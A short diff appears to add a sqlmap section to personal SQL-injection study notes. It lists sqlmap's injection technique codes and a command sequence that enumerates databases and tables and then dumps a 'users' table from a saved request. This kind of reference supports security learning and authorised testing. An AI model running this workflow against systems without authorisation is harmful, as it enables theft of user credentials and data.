@@ -92,6 +92,24 @@ server asynchronous (out of band):
   - oob interaction
   - oob data exfiltration
 
+## sqlmap
+
+technique:
+
+- B: Boolean-based blind
+- E: Error-based
+- U: Union query-based
+- S: Stacked queries
+- T: Time-based blind
+- Q: Inline queries
+
+phase:
+
+- sqlmap -r ~/Desktop/test-sqlmap -batch
+- sqlmap -r ~/Desktop/test-sqlmap -batch -dbs
+- sqlmap -r ~/Desktop/test-sqlmap -batch -D public --tables
+- sqlmap -r ~/Desktop/test-sqlmap -batch -D public -T users -dump
+
 ## References
 
 [Union attack](https://portswigger.net/web-security/sql-injection/union-attacks)
